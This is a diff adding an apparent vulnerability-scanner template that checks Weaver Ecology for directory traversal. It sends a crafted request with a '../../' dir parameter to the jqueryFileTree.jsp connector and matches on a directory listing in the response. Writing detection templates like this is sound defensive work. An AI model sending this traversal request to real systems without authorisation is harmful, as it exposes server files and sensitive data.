@@ -1,0 +1,36 @@
+id: weaver-ecology-directory-traversal
+
+info:
+  name: Weaver Ecology Directory Traversal
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects Directory Traversal vulnerability in Weaver Ecology at the given endpoint. Exploiting this vulnerability allows unauthorized access to system files or sensitive data.
+  tags: directory-traversal,weaver,ecology
+
+http:
+  - raw:
+      - |
+        GET /hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<ul class=\"jqueryFileTree\""
+          - "<li class=\"directory\""
+        part: body
+
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        regex:
+          - '(?:Parent Directory|\.\.\\/)'  # Correctly escaped and single-quoted regex
+        part: body
+
+  stop-at-first-match: true
